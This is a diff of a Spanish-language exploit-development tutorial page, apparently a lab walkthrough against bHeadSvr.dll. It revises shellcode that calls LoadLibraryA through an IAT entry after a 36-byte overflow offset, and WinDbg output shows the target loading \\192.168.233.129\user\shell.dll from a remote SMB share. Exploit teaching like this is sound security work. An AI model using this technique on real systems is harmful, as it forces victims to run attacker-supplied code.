@@ -1021,7 +1021,7 @@ Hold on...
     - (Re)setting logfile C:\mona\iatsearch.txt
     Getting IAT for bHeadSvr.dll.
     Enumerating IAT
-0x625070c8 | At 0x625070c8 in bheadsvr (base + 0x000070c8) : 0x778c0ed0 (ptr to KERNEL32.loadlibraryexa) - [KERNEL32] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.22621.3672, 0x4140  
+0x625070c8 | At 0x625070c8 in bheadsvr (base + 0x000070c8) : 0x778c0ed0 (ptr to KERNEL32.loadlibrarya) - [KERNEL32] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.22621.3672, 0x4140  
 
 1 entries found</span>
 </code></pre></div></div><br>
@@ -1111,8 +1111,7 @@ Hold on...
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">dll  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
 dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push esp"</span><span class="p">)
-dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov eax, [0x625070c8]"</span><span class="p">)  
-dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call eax"</span><span class="p">)</span>
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call [0x625070c8]"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Nuestro exploit ahora se ve de esta forma, en el inicio del payload enviamos las instrucciones a ejecutar, rellenamos y en el retorno saltamos a ellas, pero en el stack después del retorno se encuentra la string a la <code class="language-plaintext highlighter-rouge">dll</code> en el recurso <code class="language-plaintext highlighter-rouge">smb</code></p>
@@ -1122,8 +1121,7 @@ dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">
 
 dll  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
 dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push esp"</span><span class="p">)
-dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov eax, [0x625070c8]"</span><span class="p">)
-dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call eax"</span><span class="p">)
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call [0x625070c8]"</span><span class="p">)
 
 offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(dll))
@@ -1167,23 +1165,23 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 </span><span class="ro">0:000></span><span class="p"> g
 Breakpoint 0 hit
-eax=010afb14 ebx=00000170 ecx=0074170c edx=01000000 esi=0040194e edi=0040194e  
-eip=625012f2 esp=010afb3c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
+eax=00f3fb14 ebx=00000174 ecx=00d3170c edx=01000000 esi=0040194e edi=0040194e
+eip=625012f2 esp=00f3fb3c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
 bHeadSvr!EssentialFunc2+0x5:
-625012f2 ffe0            jmp     eax {010afb14}
+625012f2 ffe0            jmp     eax {00f3fb14}
 
 </span><span class="ro">0:000></span><span class="p"> da esp
-010afb3c  "\\192.168.233.129\user\shell.dll"
+00f3fb3c  "\\192.168.233.129\user\shell.dll"
 
 </span><span class="ro">0:000></span><span class="p"> pc
-eax=778c0ed0 ebx=00000170 ecx=0074170c edx=01000000 esi=0040194e edi=0040194e  
-eip=010afb1a esp=010afb38 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
-010afb1a ffd0            call    eax {KERNEL32!LoadLibraryAStub (778c0ed0)}
+eax=00f3fb14 ebx=00000174 ecx=00d3170c edx=01000000 esi=0040194e edi=0040194e
+eip=00f3fb15 esp=00f3fb38 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+00f3fb15 ff15c8705062    call    dword ptr [bHeadSvr!EssentialFunc14+0x5cf0 (625070c8)] ds:002b:625070c8={KERNEL32!LoadLibraryAStub (778c0ed0)}  
 
 </span><span class="ro">0:000></span><span class="p"> da poi(esp)
-010afb3c  "\\192.168.233.129\user\shell.dll"</span>
+00f3fb3c  "\\192.168.233.129\user\shell.dll"</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Si continuamos la ejecución carga la <code class="language-plaintext highlighter-rouge">dll</code> maliciosa y abre una calculadora</p>
@@ -1196,8 +1194,7 @@ cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
 
 dll  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
 dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push esp"</span><span class="p">)
-dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov eax, [0x625070c8]"</span><span class="p">)
-dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call eax"</span><span class="p">)
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call [0x625070c8]"</span><span class="p">)
 
 offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(dll))
